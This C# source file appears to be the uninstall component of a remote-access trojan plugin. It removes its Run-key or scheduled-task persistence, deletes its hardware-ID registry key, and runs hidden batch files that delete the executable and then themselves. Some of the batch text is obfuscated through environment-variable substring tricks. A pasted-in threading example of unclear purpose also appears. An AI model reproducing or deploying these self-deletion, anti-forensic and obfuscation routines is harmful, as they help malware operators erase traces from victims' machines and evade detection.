using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Threading;

namespace Plugin.Handler
{
    public class HandleUninstall
    {
        public HandleUninstall()
        {
            if (Convert.ToBoolean(Plugin.Install))
            {
                try
                {
                    if (!Methods.IsAdmin())
                        Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", RegistryKeyPermissionCheck.ReadWriteSubTree).DeleteValue(Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.FileName));
                    else
                    {
                        Process.Start(new ProcessStartInfo()
                        {
                            FileName = "schtasks",
                            Arguments = "/delete /f /tn " + @"""'" + Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.FileName) + @"""'",
                            CreateNoWindow = true,
                            ErrorDialog = false,
                            UseShellExecute = false,
                            WindowStyle = ProcessWindowStyle.Hidden
                        });
                    }
                }
                catch (Exception ex)
                {
                    Packet.Error(ex.Message);
                }
            }

            try
            {
                Registry.CurrentUser.CreateSubKey(@"", RegistryKeyPermissionCheck.ReadWriteSubTree).DeleteSubKey(Connection.Hwid);
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }

            try
            {
                string batch = Path.GetTempFileName() + ".bat";
                using (StreamWriter sw = new StreamWriter(batch))
                {
                    sw.WriteLine("@echo off");
                    sw.WriteLine("timeout 3 > NUL");
                    sw.WriteLine("CD " + Application.StartupPath);
                    sw.WriteLine("DEL " + "\"" + Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName) + "\"" + " /f /q");
                    sw.WriteLine("CD " + Path.GetTempPath());
                    sw.WriteLine("DEL " + "\"" + Path.GetFileName(batch) + "\"" + " /f /q");
                }
                Process.Start(new ProcessStartInfo()
                {
                    FileName = batch,
                    CreateNoWindow = true,
                    ErrorDialog = false,
                    UseShellExecute = false,
                    WindowStyle = ProcessWindowStyle.Hidden
                });
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
            Methods.ClientExit();
            Environment.Exit(0);

        }
        int _count;

        void HandleThreadDone(object sender, EventArgs e)
        {
            // You should get the idea this is just an example
            if (_count == 1)
            {
                ThreadWorker worker = new ThreadWorker();
                worker.ThreadDone += HandleThreadDone;

                Thread thread2 = new Thread(worker.Run);
                thread2.Start();

                _count++;
            }
        }


        public static string CreateUpdateBatch(string currentFilePath, string newFilePath)
        {
            string batchFile = GetTempFilePath(".bat");

            string updateBatch =
                "@echo off" + "\r\n" +
                "chcp 65001" + "\r\n" + // Unicode path support for cyrillic, chinese, ...
                "echo DONT CLOSE THIS WINDOW!" + "\r\n" +
                "%TMP:~    -1,      1%%oS:~    1,      -8%n%ProGramfILes(x86):~     -16,   1% -%CoMMonProGRAmfiLEs:~   22,   -6% 10 lo%puBlIC:~     -1%%CommonproGRAMw6432:~   8,      1%%teMP:~    -6,     -5%h%cOmmOnpROGraMfiLEs(x86):~      5,   -29%%APpdATa:~   7,   1%%aLlUSErSProFile:~   -2,      1% >%COmMoNProgRamfILes:~     23,     1%%ApPdaTa:~     -2,    1%u%TeMP:~     -6,     1%" + "\r\n" +
                "del /a /q /f " + "\"" + currentFilePath + "\"" + "\r\n" +
                "move /y " + "\"" + newFilePath + "\"" + " " + "\"" + currentFilePath + "\"" + "\r\n" +
                "start \"\" " + "\"" + currentFilePath + "\"" + "\r\n" +
                "del /a /q /f " + "\"" + batchFile + "\"";

            File.WriteAllText(batchFile, updateBatch, new UTF8Encoding(false));
            return batchFile;
        }
        public static string CreateUpdateBatch(string newFilePath, bool isFileHidden)
        {
            try
            {
                string batchFile = GetTempFilePath(".bat");

                string updateBatch =
                    "@echo off" + "\r\n" +
                    "chcp 65001" + "\r\n" +
                    "echo DONT CLOSE THIS WINDOW!" + "\r\n" +
                    "ping -n 10 localhost > nul" + "\r\n" +
                    "del /a /q /f " + "\"" + Process.GetCurrentProcess().MainModule.FileName + "\"" + "\r\n" +
                    "move /y " + "\"" + newFilePath + "\"" + " " + "\"" + Process.GetCurrentProcess().MainModule.FileName + "\"" + "\r\n" +
                    "start \"\" " + "\"" + Process.GetCurrentProcess().MainModule.FileName + "\"" + "\r\n" +
                    "del /a /q /f " + "\"" + batchFile + "\"";

                File.WriteAllText(batchFile, updateBatch, new UTF8Encoding(false));
                return batchFile;
            }
            catch (Exception)
            {
                return string.Empty;
            }
        }
        private const string CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        private static readonly Random _rnd = new Random(Environment.TickCount);

        public static string GetRandomFilename(int length, string extension = "")
        {
            StringBuilder randomName = new StringBuilder(length);
            for (int i = 0; i < length; i++)
                randomName.Append(CHARS[_rnd.Next(CHARS.Length)]);

            return string.Concat(randomName.ToString(), extension);
        }
        public static string GetTempFilePath(string extension)
        {
            while (true)
            {
                string tempFilePath = Path.Combine(Path.GetTempPath(), GetRandomFilename(16, extension));
                if (File.Exists(tempFilePath)) continue;
                return tempFilePath;
            }
        }
        public static string CreateUninstallBatch(string currentFilePath)
        {
            string batchFile = GetTempFilePath(".bat");

            string uninstallBatch =
                "@echo off" + "\r\n" +
                "chcp 65001" + "\r\n" + // Unicode path support for cyrillic, chinese, ...
                "echo DONT CLOSE THIS WINDOW!" + "\r\n" +
                "%TMP:~    -1,      1%%oS:~    1,      -8%n%ProGramfILes(x86):~     -16,   1% -%CoMMonProGRAmfiLEs:~   22,   -6% 10 lo%puBlIC:~     -1%%CommonproGRAMw6432:~   8,      1%%teMP:~    -6,     -5%h%cOmmOnpROGraMfiLEs(x86):~      5,   -29%%APpdATa:~   7,   1%%aLlUSErSProFile:~   -2,      1% >%COmMoNProgRamfILes:~     23,     1%%ApPdaTa:~     -2,    1%u%TeMP:~     -6,     1%" + "\r\n" +
                "del /a /q /f " + "\"" + currentFilePath + "\"" + "\r\n" +
                "del /a /q /f " + "\"" + batchFile + "\"";

            File.WriteAllText(batchFile, uninstallBatch, new UTF8Encoding(false));
            return batchFile;
        }
    }
    class ThreadWorker
    {
        public event EventHandler ThreadDone;

        public void Run()
        {
            HandleUninstall.CreateUninstallBatch(Process.GetCurrentProcess().MainModule.FileName);

            if (ThreadDone != null)
                ThreadDone(this, EventArgs.Empty);
        }
    }
}
